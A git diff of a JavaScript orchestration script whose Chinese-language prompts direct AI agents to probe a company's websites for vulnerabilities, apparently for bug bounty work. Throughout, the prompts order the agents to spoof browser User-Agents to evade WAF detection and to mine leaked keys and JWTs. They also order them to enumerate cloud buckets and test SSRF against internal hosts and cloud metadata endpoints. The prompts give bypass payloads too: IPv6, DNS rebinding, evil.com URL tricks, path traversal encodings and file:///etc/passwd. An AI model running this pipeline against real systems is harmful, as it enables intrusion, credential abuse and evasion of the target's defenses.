@@ -48,24 +48,21 @@ const REAL_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (K
 const UA_FLAG = `-H 'User-Agent: ${REAL_UA}'`
 const UA_INSTR = `⚠️ **User-Agent 硬性规则：所有 curl 命令必须添加 -H 'User-Agent: ${REAL_UA}'（或等效的浏览器UA），禁止使用默认 curl User-Agent，否则会被WAF/反爬识别拦截。同时添加 Accept-Language: zh-CN,zh;q=0.9 和 Accept: */* 头。**`
 
-let companyName, mode, singleUrl, workflowOptions
+let companyName, mode, singleUrl
 if (typeof args === 'string') {
   // 修复：Workflow 工具传递的对象 args 可能被序列化为 JSON 字符串
   // 先尝试 JSON 解析，成功则作为对象处理，否则当做公司名
   let parsed = null
   try { parsed = JSON.parse(args) } catch (_) {}
   if (parsed && typeof parsed === 'object') {
-    workflowOptions = parsed
     companyName = parsed.company || null
     mode = parsed.mode || 'full'
     singleUrl = parsed.url || null
   } else {
-    workflowOptions = {}
     companyName = args
     mode = 'full'
   }
 } else if (typeof args === 'object' && args) {
-  workflowOptions = args
   companyName = args.company || null
   mode = args.mode || 'full'
   singleUrl = args.url || null
@@ -97,21 +94,6 @@ if (!companyName && singleUrl) {
     log(`ℹ️ 未指定公司名，自动使用URL域名作为公司标识`)
   }
 }
-
-const parseWorkflowBool = (v) => v === true || v === 1 || v === '1' || String(v).toLowerCase() === 'true' || String(v).toLowerCase() === 'yes'
-const skipDirsearch = parseWorkflowBool(workflowOptions?.skipDirsearch) || parseWorkflowBool(workflowOptions?.noDirsearch)
-const skipFuzz = parseWorkflowBool(workflowOptions?.skipFuzz) || parseWorkflowBool(workflowOptions?.noFuzz)
-
-// ============================================================
-// 代理配置 — 所有 curl 请求通过代理发送
-// 用法: {..., proxy: "http://127.0.0.1:7890"}
-// ============================================================
-const PROXY_URL = workflowOptions?.proxy || workflowOptions?.httpProxy || workflowOptions?.httpsProxy || ''
-const PROXY_FLAG = PROXY_URL ? `-x '${PROXY_URL}'` : ''
-const PROXY_INSTR = PROXY_URL
-  ? `⚠️ **代理硬性规则：所有 curl 命令必须添加 ${PROXY_FLAG} 参数，通过代理 ${PROXY_URL} 发出请求。禁止直连目标服务器。**
-⚠️ **Python脚本/其他工具也需通过代理：执行前先 export HTTP_PROXY=${PROXY_URL} HTTPS_PROXY=${PROXY_URL} http_proxy=${PROXY_URL} https_proxy=${PROXY_URL}，或命令前缀加上 HTTP_PROXY=${PROXY_URL} HTTPS_PROXY=${PROXY_URL}。**`
-  : ''
 
 // 目标进度追踪
 const progress = {
@@ -552,13 +534,11 @@ python3 ${SKILL_SCRIPTS}/extract_creds.py "\${dump_dir}" 2>&1
           { label: `🤖 机械操作: ${target}`, phase: '深度分析' }
         )
 
-        // 解析结果 — 声明在 for 外部，避免 let 块作用域问题
+        // 解析结果
         let dl_dump_dir = "${SRC_BASE}/${companyName}/js_dumps"
         let dl_file_count = 0
         let target_hash = ""
-        for (let _retry = 0; _retry < 2; _retry++) {
-          var mechResult = await agent(
-          `执行以下命令串行:
+        try {
           const dlPart = (mechResult || '').split('---DOWNLOAD_RESULT---')[1] || ''
           const dlMatch = dlPart.match(/{[^}]+}/)
           if (dlMatch) {
@@ -623,26 +603,11 @@ python3 ${SKILL_SCRIPTS}/extract_creds.py "\${dump_dir}" 2>&1
     2. **路径模式提取** — 提取所有 "/xxx/yyy" 路径，关注非标准前缀 /gateway/ /dwr/ /sys/ /manage/ /crm/ /erp/
     3. **敏感信息提取** — 查找 AccessKey、SecretKey、JWT(eyJ...)、数据库连接串(mongodb://...)、内网IP、硬编码密码
     4. **鉴权方式识别** — Authorization: Bearer/Basic/X-TOKEN/Cookie/localStorage Token存放
-    5. **Call Site 深度追溯 — 对每个发现的API端点，必须追溯其调用现场（call site）**
-       对每个提取到的API路径（如 /apix/image-colors），在JS中找到所有调用该端点的地方，提取：
-       - **请求体参数结构**：调用时传入了哪些字段？
-         代码示例:
-           const n = t => e({url:"/apix/image-colors", req:t, method:"POST"});
-           // 找到调用 n(...) 的地方：
-           n({url: "...", width: 200, height: 200})
-           // 提取到的字段: url, width, height 说明存在 url 参数，即 SSRF 攻击面
-       - **返回值消费方式**：响应数据被怎样使用了？(渲染到页面？传给其他API？)
-       - **参数来源**：参数来自用户输入？固定值？props？store？URL query？
-       - **输出格式**：将每个端点的字段名列表结构化输出，如：
-         输出示例:
-           /apix/image-colors: {url, width?, height?, quality?}  ← 有 url 参数，SSRF风险
-           /apix/V1/.../list: {page?, pageSize?, categoryId?}    ← 分页参数
-    6. **调用现场溯源 (Call Site JSON)**：
-       - 如果以上分析找到了请求体参数，输出为结构化JSON格式，供Phase 3直接使用
-       - 如果JS被严重混淆/无法追溯到call site 输出 request_params 为 unresolved，同时分析响应线索：
-         - 用Phase 2已有的curl探测能力，对该端点发送一个空POST，看返回的错误提示中是否包含期望的字段名
-         - 例如返回 {"error":"缺少参数 imageUrl"} 说明有 imageUrl 参数，存在SSRF机会
-         - 这种反向推断也是有效的参数发现手段
+    5. **凭证反思（关键思维环节）**:
+       - 找到accessKey+secretKey → 哪个云服务？试枚举 OBS/S3/OSS Bucket
+       - 找到JWT → 解码看user/role，试调API看是否越权
+       - 找到API路径 → 功能命名推断数据敏感度
+       - 找到内部域名 → 判断环境(dev/test/prod)
 
     **注意：**
     - 遇到混淆JS尝试识别混淆类型(webpack/jscrambler/_0x)
@@ -650,8 +615,7 @@ python3 ${SKILL_SCRIPTS}/extract_creds.py "\${dump_dir}" 2>&1
     - 发挥第一性原理和创造性思维，不要局限于固定模式
     - 注意看Source Map还原出的文件: 检查是否有 reconstructed/ 目录（包含原始TS/Vue/React源码）
 
-    ${UA_INSTR}
-    ${PROXY_INSTR}`,
+    ${UA_INSTR}`,
           { label: `🔬 分析: ${target}`, phase: '深度分析' }
         )
       },
@@ -857,7 +821,6 @@ ${targets.slice(0, 20).map(function(t) { return '  ' + t.url }).join(String.from
 **输出 JSON，每个目标一个条目。**
 
       ${UA_INSTR}
-      ${PROXY_INSTR}
       ⚠️ **严格边界规则：仅使用 curl 探测目标URL。不要读取任何本地文件。不要提及或引用任何其他厂商的数据。**`,
       { label: '🔍 快速开发框架识别', schema: {
         type: 'object',
@@ -945,9 +908,6 @@ ${targets.slice(0, 20).map(function(t) { return '  ' + t.url }).join(String.from
     // 2.5 dir_enum — 基于系统特征的智能路径枚举（智能fuzz）
     // 原理：根据已识别的框架 + JS发现的API路径格式，自动泛化fuzz
     // ============================================================
-    if (skipFuzz) {
-      log('  ⏭️ 跳过智能路径枚举（用户指定 skipFuzz=true）')
-    } else {
     log('  🔍 执行智能路径枚举（基于系统特征自动泛化fuzz）...')
     const P2_DICT_PATH = "${SKILL_SCRIPTS}/../references/api_patterns.json"
 
@@ -956,7 +916,7 @@ ${targets.slice(0, 20).map(function(t) { return '  ' + t.url }).join(String.from
     for (const ft of fuzz_targets) {
       const fuzz_out = "/tmp/smart_fuzz_" + companyName.replace(/[^a-zA-Z0-9]/g,'_') + "_" + ft.replace(/[^a-zA-Z0-9]/g,'_') + ".json"
       const fuzz_cmd = `python3 ${SKILL_SCRIPTS}/smart_fuzz.py "${ft}" --dict ${P2_DICT_PATH} --output ${fuzz_out} --ua "${REAL_UA}"`
-
+      
       let fuzz_raw = null
       try {
         fuzz_raw = await agent(
@@ -1004,7 +964,6 @@ cat ${fuzz_out}`,
       p2_discoveries_text += `\n\n【智能fuzz发现的潜在端点】\n${fuzzSummary}\n`
       log(`  🔄 ${globalThis.__p2_fuzz_findings.length} 个fuzz发现已注入Phase3上下文`)
     }
-    }  // end skipFuzz else
     targets.forEach(t => dimTracker.record(t, 'dir_enum', 'done'))
   // P0-2: 持久化 accumulated 状态到临时文件（避免agent崩溃丢失）
   try {
@@ -1061,15 +1020,10 @@ if (mode.startsWith('phase5')) {
     // 3.0 dirsearch — 基于字典的标准目录扫描
     // 原理：读取积累字典+通用字典，对目标做广度优先的路径爆破
     // ============================================================
-    let p3_dirsearch; let P3_DICT_PATH
-    if (skipDirsearch) {
-      log('  ⏭️ 跳过字典目录扫描（用户指定 skipDirsearch=true）')
-      p3_dirsearch = { findings: [], new_endpoints: [] }
-    } else {
-      log('  📂 执行字典目录扫描 (dirsearch)...')
-      P3_DICT_PATH = "${SKILL_SCRIPTS}/../references/api_patterns.json"
+    log('  📂 执行字典目录扫描 (dirsearch)...')
+    const P3_DICT_PATH = "${SKILL_SCRIPTS}/../references/api_patterns.json"
 
-    p3_dirsearch = await agent(
+    const p3_dirsearch = await agent(
       `对 ${companyName} 执行 dirsearch 目录扫描（使用 dirsearch 内置字典 + 积累字典）。
 
 ===== 目标列表（前20个） =====
@@ -1121,7 +1075,6 @@ dirsearch -u "<target_url>" \
 同时在 new_endpoints 中输出本次新发现的可积累端点。
 
       ${UA_INSTR}
-      ${PROXY_INSTR}
       ⚠️ **边界规则：仅对目标列表URL执行。不要读取本地非字典文件。**`,
       { label: '📂 字典目录扫描 (dirsearch)', schema: {
         type: 'object',
@@ -1185,8 +1138,6 @@ ${p3_dirsearch.new_endpoints.map(function(e) { return '  - ' + e }).join(String.
       }
     }
 
-    }  // end skipDirsearch else block
-
     // 3.1 未授权/信息泄露测试（遵循: 反思为主→迁跃为辅→分析为底→扩展为路）
     p3_unauth = await agent(
       `你是SRC漏洞挖掘专家，对 ${companyName} 执行未授权访问和信息泄露测试。
@@ -1220,106 +1171,41 @@ ${typeof globalThis.__p2_js_dirs_json !== 'undefined' ? 'JS文件已下载到本
 
 **【核心策略 — 🎯 Agent 发散思维 + 靶标定制】**
 
-**核心原则：基于请求参数决定漏洞测试方向，而非API路径名。**
+**首先思考：这个系统做什么的？数据流？鉴权怎么实现的？哪个模块最可能有漏洞？**
+基于 Phase 2 的 JS 分析 + 框架识别 + 发现的 API 路径，用第一性原理推断：
+- 物流平台 → 关注订单/运单/用户API的越权和遍历
+- 管理后台 → 关注权限提升/未授权/配置泄露
+- API网关 → 关注SSRF/路径穿越/鉴权绕过
+- **先理解系统再动手，不要机械照搬路径列表**
 
-Phase 2 的 JS 分析已经提取了每个 API 端点的调用现场参数结构。收到 API 端点列表后，对每个端点按以下多级策略执行：
+不要只测固定路径列表。对于从 JS 发现的 API 路径，先分析命名再选择测试手法：
 
----
-
-### 第一级：Call Site 参数驱动（最高优先级 — 根据JS分析到的请求参数字段名决定漏洞方向）
-
-**收到的 Phase 2 分析结果中包含了每个端点的请求参数字段名列表**（如 /apix/image-colors: {url, width?, height?}）
-
-如果该端点有明确的请求参数字段名数据，则**完全基于参数字段名决定漏洞测试方向**，而不是API路径名：
-
-| 请求参数中的字段名 | 对应的漏洞测试方向 |
-|---|---|
-| url, image_url, file_url, src, href, link, download_url, redirect | **SSRF**（IPv6绕过/DNS重绑定）+ **路径穿越** |
-| file, file_path, path, filename, download, template_path | **路径遍历/任意文件读取** |
-| content, html, markdown, template, body, message, render | **XSS/SSTI模板注入** |
-| page, limit, offset, pageSize, pageNum, start, end | **批量数据遍历/未授权分页访问** |
-| id, userId, orderId, studentId, companyId, appId, key | **IDOR水平越权**（替换id值遍历） |
-| price, amount, quantity, discount, coupon, total | **逻辑漏洞/金额篡改/优惠券滥用** |
-| data, xml, json, document, payload | **XXE/注入/反序列化** |
-| redirect, callback, next, forward, returnUrl, referer | **开放重定向/SSRF** |
-| token, accessToken, sessionKey, apiKey, secret | **Token伪造/越权/凭证泄露** |
-| image, video, media, file, attachment, upload | **文件上传绕过/任意文件写入/SSRF** |
-| command, cmd, exec, shell, code, expression | **命令执行/表达式注入/RCE** |
-
-**关键认知**：同一个端点名可能对应完全不同的漏洞类型，取决于它收什么参数：
-- /apix/image-colors 若参数含 url 则测 **SSRF**
-- /apix/generate-avatar 若参数含 template 则测 **SSTI**
-- /apix/data/export 若参数含 id 则测 **IDOR**；若含 file 则测 **路径遍历**
-
-**针对每个端点的测试步骤：**
-1. 看它的参数字段名列表，从上方映射表找到对应的漏洞类型
-2. 对每个参数名做相应的攻击测试
-3. **如果某个参数的含义是让服务端去获取外部资源（url/image_url/href等），必须测 SSRF**
-4. **SSRF测不了再测参数注入/越权/其他**
-
----
-
-### 第二级：按API路径名推断（兜底 — 当Phase 2未提供call site参数结构时使用）
-
-当无JS call site数据或不明确参数结构时，才按API路径名推断：
-
-1. 分析 API 命名:
+1. 分析 API 命名 → 推断功能 → 对应攻击:
    upload/file/import/attachment       → **文件上传绕过/任意文件写入**
    download/export/backup/fetch        → **路径遍历/任意文件读取**
-   order/payment/bill/account/balance  → **IDOR越权**
+   order/payment/bill/account/balance  → **IDOR越权（替换id/userId参数）**
    login/auth/token/session            → **认证绕过/弱口令/JWT伪造**
    admin/manager/console/dashboard     → **垂直越权/权限提升**
    config/settings/env/param           → **配置泄露/敏感信息**
    sql/search/query/select             → **SQL注入/SSTI**
-   exec/run/command/shell/exec         → **命令执行/RCE**
+   exec/run/command/shell/exec     → **命令执行/RCE**
    delete/drop/remove/clear            → **未授权删除**
    page/list/search/query              → **批量遍历/未授权敏感数据**
 
----
+2. 根据参数名判断测试方向:
+   id/userId/orderId → 替换遍历看响应变化
+   file/path/url     → 路径穿越(../)、SSRF
+   page/pageSize     → 分页遍历
+   callback/jsonp    → XSS/JSON劫持
+   redirect/next/url → 开放重定向
+   data/html/content → XSS/富文本注入
 
-### 第三级：兜底检测 — 响应体反向推断参数 + 通用路径扫描
-
-**对于所有 POST 端点，即使不知道请求参数结构也做以下操作：**
-
-a) **响应体反向推断**：发一个空POST body，看错误响应中是否提示期望字段
-   - 返回 {"error": "missing field imageUrl"} 说明参数含 imageUrl
-   - 返回 {"msg": "url不能为空"} 说明有 url 参数，SSRF机会
-   - 返回 {"error": "file not found"} 说明有 file/path 参数
-
-b) **通用路径探测**（始终执行）:
-   - API文档: /swagger-ui.html, /v3/api-docs, /doc.html
-   - 配置: /.env, /actuator, /actuator/heapdump
-   - 备份: .bak, .old, .swp
-
----
-
-### 第四级：协议级绕过与原理推理（当标准测试被拦截时使用）
-
-**如果标准测试返回403/被WAF拦截/接口无响应，不要放弃，从漏洞原理和请求参数出发推理绕过：**
-
-1. **SSRF绕过（当url/image_url等参数被防护）**:
-   - IPv6绕过黑名单: http://[::1]:8080, http://[0:0:0:0:0:ffff:127.0.0.1]:8080
-   - DNS重绑定: http://127.0.0.1.nip.io:8080
-   - URL解析差异: http://127.0.0.1:8080@evil.com, http://evil.com/../127.0.0.1/
-   - 短链接/302跳绕过: 自己搭一个302跳转到内网地址的外部域名
-   - 云元数据IPv6: http://[fd00:ec2::254]/latest/meta-data/
-
-2. **路径穿越绕过（当file/path参数被过滤）**:
-   - URL编码: %2e%2e%2f, ..%252f, ....//....//
-   - Unicode/UTF-8变体: %c0%ae%c0%ae%c0%af
-   - 协议混合: file:///etc/passwd, php://filter/...
-
-3. **WAF绕过（整体）**:
-   - 大小写混写: SQL -> sQl
-   - 参数污染: id=1&id=2, id=1&id[]=2
-   - Content-Type切换: JSON / form-urlEncoded / XML
-   - 编码绕过: Base64、Unicode、双URL编码
-
-4. **第一性原理推演**（每次绕过尝试前必须执行）:
-   - 这个参数最终会进入哪段逻辑？(数据库查询/文件系统/HTTP请求/模板引擎/命令执行)
-   - 后端可能怎么校验输入？(黑名单/白名单/类型校验/长度校验)
-   - 校验在哪一层？(WAF/API网关/应用层代码) 层间解析差异即绕过机会
-   - 如果我是开发，会怎么防御？在防御的盲区寻找突破口
+3. SSRF专项测试（参数含 url/path/redirect/domain/host/target）:
+   - 替换为内网地址: http://127.0.0.1:8080, http://10.0.0.1, http://172.16.0.1
+   - 云元数据: http://169.254.169.254/latest/meta-data/（AWS/阿里云）
+   - 华为云元数据: http://169.254.169.254/openstack/latest/
+   - 内部服务探测: http://localhost:6379(Redis), http://localhost:3306(MySQL)
+   - 观察响应差异: 超时vs拒绝vs返回数据 = 内网服务存活
 
 4. 组件版本识别 + CVE比对:
    - 识别组件指纹（从响应头Server/X-Powered-By/body中的版本号）
@@ -1354,7 +1240,6 @@ b) **通用路径探测**（始终执行）:
 
 
       ⚠️ **User-Agent 硬性规则：所有 curl 命令必须添加 -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'（或等效的浏览器UA），禁止使用默认 curl User-Agent，否则会被WAF/反爬识别拦截。同时添加 Accept-Language: zh-CN,zh;q=0.9 和 Accept: */* 头。**
-      ${PROXY_INSTR}
 
       ⚠️ **严格边界规则：仅对目标列表中的URL进行测试。不要读取任何本地文件。不要引用、提及或包含任何其他厂商的数据。**`,
       { label: `🔓 未授权/信息泄露测试`, schema: {
@@ -1451,7 +1336,6 @@ ${typeof globalThis.__p2_js_dirs_json !== 'undefined' ? JSON.parse(globalThis.__
 
 
       ⚠️ **User-Agent 硬性规则：所有 curl 命令必须添加 -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'（或等效的浏览器UA），禁止使用默认 curl User-Agent，否则会被WAF/反爬识别拦截。同时添加 Accept-Language: zh-CN,zh;q=0.9 和 Accept: */* 头。**
-      ${PROXY_INSTR}
 
       ⚠️ **严格边界规则：仅对目标列表中的URL进行测试。不要读取任何本地文件。不要引用、提及或包含任何其他厂商的数据。**`,
       { label: `🎯 越权/弱口令测试`, schema: {
@@ -1525,7 +1409,6 @@ ${_t2urls}\t第2阶段提取的结构化凭证:
 
 
         ⚠️ **User-Agent 硬性规则：所有 curl 命令必须添加 -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'（或等效的浏览器UA），禁止使用默认 curl User-Agent，否则会被WAF/反爬识别拦截。同时添加 Accept-Language: zh-CN,zh;q=0.9 和 Accept: */* 头。**
-      ${PROXY_INSTR}
 
         ⚠️ **严格边界规则：仅对当前列表中的URL进行测试。不要读取任何本地文件。不要引用、提及或包含任何其他厂商的数据。**`,
         { label: '⚡ Tier2快速探测', schema: {
@@ -1673,20 +1556,6 @@ Step C: 如果响应是 JSON → 提取 d.get('data') 判断类型:
 
 发散方向（对每个发现依次思考）：
 
-**0. 信息流协同 — 验证前先扫描当前对话中的上下文（最高优先级）**
-当你接收到一个 API 端点时，**不要孤立测试**，先在当前信息流中搜索与该端点相关的所有已知信息：
-- 查 Phase 2 JS 分析结果：该端点的 call site 参数结构是什么？（即 {url, width?, height?} 这样的字段列表）
-  - 如果有字段列表，直接按字段名决定漏洞测试方向（每个字段名映射一个漏洞类型）
-- 查 Phase 3 已有结论：该端点之前是否已经被测试过？结论是什么？
-- 查 _credentials.json：该端点涉及的凭证信息（Token/API Key等）是否已被提取？
-- 查 fuzz 结果：该端点的子路径或变体是否已被发现？
-- 联合判定：如果你发现该端点的 JS call site 定义了参数 url: string，无论端点名是什么，都必须测 SSRF
-- 结论：**不要只看端点路径名判断漏洞类型，要看构建请求包时传了哪些参数**
-
-**0b. 响应体逆向推断参数（当JS分析未提供call site参数时）**
-- 对 POST 端点发送空 body，看错误响应是否提示期望字段
-- 例：返回 {"missing":"imageUrl"} 字段含 imageUrl，SSRF机会
-
 **4a. 参数发散 — 同一端点的其他参数**
 发现 /api/user?id=1 → 发散试:
 - /api/user?orderId=2       (是否越权查其他资源)
@@ -1721,15 +1590,7 @@ JSON → Form-URLEncoded（参数解析差异）
 如果 Phase 2 发现了隐藏API路径或凭证，思考这些路径是否存在与当前发现类似的漏洞模式。
 访问本地JS文件确认（路径见上方JS缓存目录）。
 
-**4g. 原理级绕过发散（当标准测试被WAF/防护拦截时 — 关键思维能力）**
-如果直接测试被 WAF/防护/校验拦截（403/400/拦截页面），必须从原理推理绕过：
-- SSRF 被拦截: IPv6映射 [::1]/DNS重绑定 127.0.0.1.nip.io/URL解析差异 127.0.0.1#@evil.com
-- 路径穿越被拦截: URL双编码 ..%252f/Unicode变体/协议混合 file://
-- SQL注入被拦截: 大小写混写/参数污染/编码绕过
-- **核心推理链路**：这个参数最终传给什么函数？那个函数接受的合法格式是什么？绕过就在合法格式与黑名单之间的间隙
-- **如果当前手段绕不过，回溯到参数本身**：换个参数尝试、换个HTTP方法、换个Content-Type、加个Header
-
-**4h. 利用链思考 — 当前发现能否与其他发现串联**
+**4g. 利用链思考 — 当前发现能否与其他发现串联**
 存在利用链可能 → 报告时标记为利用链格式
 
 **Step 5: 变种验证**
@@ -1749,7 +1610,6 @@ JSON → Form-URLEncoded（参数解析差异）
 新增的变种发现追加到 confirmed_findings 数组。
 
       ⚠️ **User-Agent 硬性规则：所有 curl 命令必须添加 -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'（或等效的浏览器UA），禁止使用默认 curl User-Agent，否则会被WAF/反爬识别拦截。同时添加 Accept-Language: zh-CN,zh;q=0.9 和 Accept: */* 头。**
-      ${PROXY_INSTR}
 
       ⚠️ **严格边界规则：仅验证当前公司的漏洞数据。不要引用、提及或包含任何其他厂商的数据。**`,
       { label: '🔍 漏洞复测验证', schema: {
